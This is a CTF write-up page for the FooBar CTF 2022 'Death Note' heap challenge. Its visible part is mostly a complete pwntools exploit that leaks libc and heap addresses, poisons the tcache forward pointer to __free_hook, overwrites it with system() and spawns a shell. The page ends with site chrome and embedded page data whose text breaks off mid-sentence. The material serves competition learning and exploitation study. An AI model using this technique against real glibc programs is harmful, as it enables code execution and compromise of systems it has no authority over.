<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment">#!/usr/bin/env python3</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line">
</span><span class="code-line">exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./dnote_patched&quot;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc-2.32.so&quot;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line">ld <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./ld-2.32.so&quot;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
</span><span class="code-line">context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&#x27;debug&#x27;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;1&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;size : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;Name : &#x27;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;2&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&#x27;\n&#x27;</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;3&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">&#x27;./dnote_patched&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># p = connect(&#x27;chall.nitdgplug.org&#x27;, 30094)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">########################################</span>
</span><span class="code-line"><span class="token comment">### Stage 1: Leak main arena address ###</span>
</span><span class="code-line"><span class="token comment">########################################</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x1100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1c5220</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;Libc base: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">##################################</span>
</span><span class="code-line"><span class="token comment">### Stage 2: Leak heap address ###</span>
</span><span class="code-line"><span class="token comment">##################################</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;Heap base: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">##########################################</span>
</span><span class="code-line"><span class="token comment">### Stage 3: Overwrite forward pointer ###</span>
</span><span class="code-line"><span class="token comment">##########################################</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b&#x27;testtest&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">fake_fw_pointer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0xb40</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;__free_hook&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x100</span>                 <span class="token comment"># Padding to tcache</span>
</span><span class="code-line">payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x111</span><span class="token punctuation">)</span>               <span class="token comment"># Prev_size and size of tcache</span>
</span><span class="code-line">payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>fake_fw_pointer<span class="token punctuation">)</span>        <span class="token comment"># Overwrite forward pointer</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x130</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">######################################################</span>
</span><span class="code-line"><span class="token comment">### Stage 4: Overwrite `__free_hook` with system() ###</span>
</span><span class="code-line"><span class="token comment">######################################################</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b&#x27;/bin/sh&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;system&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="4-get-flag"><a href="#4-get-flag" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>4. Get flag</h2>
<p>Unfortunately, the time has passed and the server was closed so I cannot connect to it to get the flag but I ran it locally.</p>
<p><img src="/static/images/foobar-ctf-2022/images/get_flag.png" alt="get_flag.png"/></p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Ffoobar-ctf-2022%2Fdeath-note">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/foobar-ctf-2022/death-note.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note">github.com</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/foobar-ctf-2022/">FooBar-CTF-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn/">pwn</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/heap/">heap</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/shell/">Shell</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/binary-exploit/">Binary-Exploit</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ugra-ctf-quals-2022/xorxorracing/">Ugra CTF Quals 2022 – Хохорейсинг</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/utctf-2022/irc/">UTCTF 2022 – IRC</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var l=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=\u003el(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let e of p(s))!m.call(a,e)\u0026\u0026e!==\"default\"\u0026\u0026l(a,e,{get:()=\u003es[e],enumerable:!(c=d(s,e))||c.enumerable});return a},g=a=\u003ek(t(l(a!=null?r(h(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((y,i)=\u003e{i.exports=_jsx_runtime});var w={};N(w,{default:()=\u003ef,frontmatter:()=\u003ex});var n=g(o()),x={title:\"FooBar CTF 2022 \\u2013 Death Note\",date:\"2022-03-08\",draft:!1,authors:[\"Johnathan\"],tags:[\"FooBar CTF 2022\",\"pwn\",\"heap\",\"Shell\",\"Binary Exploit\"],summary:\"A classic heap challenge in FooBar.\",canonical:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",pre:\"pre\",code:\"code\",img:\"img\",strong:\"strong\",h3:\"h3\",ul:\"ul\",li:\"li\",ol:\"ol\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"foobarctf---death-note\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#foobarctf---death-note\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"FoobarCTF - Death Note\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"You can download challenge file in repo: \",(0,n.jsx)(e.a,{href:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note/dist.zip\",children:\"dist.zip\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"There will be several files in zip as below:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`__MACOSX\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`__MACOSX/dist\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/dnote\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/ld-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/libc-2.32.so\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Download and extract, then use \",(0,n.jsx)(e.code,{children:\"pwninit\"}),\" to patch file. And now, let\\u2019s start!\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"1-find-bug\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First, we will use \",(0,n.jsx)(e.code,{children:\"file\"}),\" to check for basic information:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"$ \",(0,n.jsx)(e.span,{className:\"token function\",children:\"file\"}),` dnote\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"dnote: ELF \",(0,n.jsx)(e.span,{className:\"token number\",children:\"64\"}),\"-bit LSB executable, x86-64, version \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\", dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"sha1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"8980c2c36d828a8b8434c28e64dd0cf4777fd7cf, \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" GNU/Linux \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3.2\"}),`.0, not stripped\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This is a 64-bit file without being stripped. Next, we will use \",(0,n.jsx)(e.code,{children:\"checksec\"}),\" to check for all defences of file:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`$ checksec dnote\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Well, we can see that just \",(0,n.jsx)(e.code,{children:\"NX enabled\"}),\". Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go through all of them.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First is the \",(0,n.jsx)(e.code,{children:\"main()\"}),\" function. We can see that there are 3 subfunction: \",(0,n.jsx)(e.code,{children:\"Add Page\"}),\", \",(0,n.jsx)(e.code,{children:\"Show Page\"}),\" and \",(0,n.jsx)(e.code,{children:\"Delete Page\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"With the first option \",(0,n.jsx)(e.code,{children:\"Add Page\"}),\", we can add up to 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with 